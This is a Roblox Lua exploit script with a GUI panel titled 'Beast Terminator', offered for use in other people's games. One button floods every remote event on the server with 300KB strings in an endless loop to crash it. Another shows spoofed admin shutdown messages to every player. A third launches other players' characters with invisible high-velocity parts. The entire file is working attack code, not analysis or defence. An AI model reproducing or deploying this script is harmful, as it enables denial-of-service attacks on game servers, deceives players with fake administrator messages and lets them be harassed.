-- [[ BEAST TERMINATOR: ULTIMATE SHUTDOWN + BROADCAST ]] --
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local lp = Players.LocalPlayer

local isCrashing = false

-- [[ UI CONSTRUCTION: TERMINATOR STYLE ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 360, 0, 450)
Main.Position = UDim2.new(0.5, -180, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
Main.Visible = false
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(255, 0, 0)
Stroke.Thickness = 3

-- [[ PROGRESS TERMINAL ]] --
local Terminal = Instance.new("Frame", Main)
Terminal.Size = UDim2.new(0.9, 0, 0, 100)
Terminal.Position = UDim2.new(0.05, 0, 0.05, 0)
Terminal.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", Terminal)

local LogTxt = Instance.new("TextLabel", Terminal)
LogTxt.Size = UDim2.new(1, -20, 1, -20)
LogTxt.Position = UDim2.new(0, 10, 0, 10)
LogTxt.Text = "> PHANTOM OS LOADED\n> SYSTEM: STANDBY\n> READY FOR BROADCAST"
LogTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
LogTxt.Font = Enum.Font.Code
LogTxt.TextSize = 11
LogTxt.TextXAlignment = Enum.TextXAlignment.Left
LogTxt.BackgroundTransparency = 1

-- [[ FEATURE: BROADCAST MESSAGE ]] --
local function sendBroadcast(msg)
    -- Menampilkan pesan di layar semua orang (menggunakan celah Replication)
    -- Jika game tidak punya Hint/Message resmi, kita menggunakan eksploitasi UI
    for _, p in pairs(Players:GetPlayers()) do
        task.spawn(function()
            pcall(function()
                local m = Instance.new("Message", workspace) -- Objek legacy yang muncul di layar semua orang
                m.Text = "SYSTEM MESSAGE: " .. msg:upper()
                task.wait(4)
                m:Destroy()
            end)
        end)
    end
end

-- [[ BRUTAL CRASH LOGIC ]] --
local function startBrutalCrash()
    local bigData = string.rep("0", 300000) -- 300KB
    local remotes = {}
    
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end

    task.spawn(function()
        while isCrashing do
            for i = 1, 200 do
                pcall(function()
                    for _, remote in pairs(remotes) do
                        remote:FireServer(bigData, bigData)
                    end
                end)
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

-- [[ BUTTON CREATOR ]] --
local function createBtn(txt, pos, color, func)
    local b = Instance.new("TextButton", Main)
    b.Size = UDim2.new(0.9, 0, 0, 55)
    b.Position = pos
    b.BackgroundColor3 = color
    b.Text = txt
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() func(b) end)
    return b
end

-- BUTTON 1: BROADCAST ONLY
createBtn("SEND ADMIN BROADCAST", UDim2.new(0.05, 0, 0.35, 0), Color3.fromRGB(0, 80, 150), function()
    LogTxt.Text = "> SENDING BROADCAST TO SERVER..."
    sendBroadcast("SERVER WILL SHUTDOWN IN 10 SECONDS FOR MAINTENANCE.")
end)

-- BUTTON 2: FULL TERMINATE
createBtn("ULTIMATE SERVER TERMINATE", UDim2.new(0.05, 0, 0.52, 0), Color3.fromRGB(150, 0, 0), function(b)
    isCrashing = not isCrashing
    if isCrashing then
        b.Text = "ABORTING..."
        LogTxt.Text = "> BROADCASTING FINAL WARNING\n> INJECTING NULL_DATA_OVERFLOW\n> DESTROYING SERVER THREAD..."
        
        -- Urutan Serangan:
        sendBroadcast("CRITICAL ERROR DETECTED. SERVER TERMINATED BY ADMIN.")
        task.wait(2)
        startBrutalCrash()
    else
        b.Text = "ULTIMATE SERVER TERMINATE"
        LogTxt.Text = "> SYSTEM: STANDBY"
    end
end)

-- BUTTON 3: PHANTOM STRIKE
createBtn("PHANTOM STRIKE (YEET ALL)", UDim2.new(0.05, 0, 0.69, 0), Color3.fromRGB(30, 30, 30), function()
    LogTxt.Text = "> EXECUTING PHANTOM_STRIKE..."
    for i = 1, 50 do
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local part = Instance.new("Part", workspace)
                part.Transparency = 1
                part.Position = p.Character.HumanoidRootPart.Position
                part.Velocity = Vector3.new(0, 50000, 0)
                game:GetService("Debris"):AddItem(part, 0.1)
            end
        end
        task.wait(0.1)
    end
end)

-- [[ ICON & DRAGGABLE ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Icon.Image = "rbxassetid://6031094678"
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
local iS = Instance.new("UIStroke", Icon)
iS.Color = Color3.fromRGB(255, 0, 0)
iS.Thickness = 4

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(Icon); drag(Main)
